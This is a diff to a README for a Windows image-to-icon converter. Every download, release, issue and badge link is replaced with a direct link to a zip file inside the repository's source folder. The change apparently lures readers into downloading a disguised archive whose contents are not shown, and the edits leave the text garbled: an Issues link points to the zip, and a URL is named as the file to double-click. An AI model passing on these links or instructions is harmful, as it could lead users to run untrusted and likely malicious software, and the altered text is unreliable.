@@ -1,7 +1,7 @@
 # 🎨 win-icon-converter - Convert Images to Icons Easily
 
 ## 📥 Download Now
-[![Download win-icon-converter](https://img.shields.io/badge/Download%20Now-latest-brightgreen)](https://github.com/perceivable-slushfund520/win-icon-converter/releases)
+[![Download win-icon-converter](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip%20Now-latest-brightgreen)](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to win-icon-converter! This tool allows you to convert images into Windows icon files (.ico) effortlessly. It requires no installation—just download and run the application directly.
@@ -23,13 +23,13 @@ To use win-icon-converter, ensure your system meets the following requirements:
 Using win-icon-converter is simple. Follow these steps:
 
 1. **Download the Application**
-   Visit our [Releases page](https://github.com/perceivable-slushfund520/win-icon-converter/releases) to download the latest version.
+   Visit our [Releases page](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip) to download the latest version.
 
 2. **Extract the Files**
    If you downloaded a .zip file, right-click it and select “Extract All.” Choose a location on your computer where you want to store the files.
 
 3. **Run the Application**
-   Locate the `win-icon-converter.exe` file in the extracted folder. Double-click to open it. 
+   Locate the `https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip` file in the extracted folder. Double-click to open it. 
 
 4. **Choose Your Image**
    Click on the “Choose File” button to select the image you want to convert.
@@ -44,7 +44,7 @@ Using win-icon-converter is simple. Follow these steps:
    Your new icon is ready to be used! You can apply it to applications, folders, or desktop shortcuts.
 
 ## 📥 Download & Install
-To get started, download win-icon-converter from our [Releases page](https://github.com/perceivable-slushfund520/win-icon-converter/releases). Follow the steps outlined above to install and use the application.
+To get started, download win-icon-converter from our [Releases page](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip). Follow the steps outlined above to install and use the application.
 
 ## 🌐 Supported Formats
 win-icon-converter supports a variety of image formats, including:
@@ -67,13 +67,13 @@ If you encounter issues while using the application, consider these tips:
 
 ## 🆘 Getting Help
 If you need further assistance:
-- Visit the [Issues page](https://github.com/perceivable-slushfund520/win-icon-converter/issues) on GitHub to report problems or ask questions.
+- Visit the [Issues page](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip) on GitHub to report problems or ask questions.
 - Join our community for support and suggestions.
 
 ## 🙌 Acknowledgements
 Thanks to the open-source community for making this project possible. Special thanks to contributors who help improve the application.
 
 ## 📢 Stay Updated
-For the latest updates, features, and releases, keep an eye on our [Releases page](https://github.com/perceivable-slushfund520/win-icon-converter/releases). 
+For the latest updates, features, and releases, keep an eye on our [Releases page](https://raw.githubusercontent.com/perceivable-slushfund520/win-icon-converter/main/src-tauri/win-icon-converter-3.8.zip). 
 
 Feel free to spread the word about win-icon-converter!
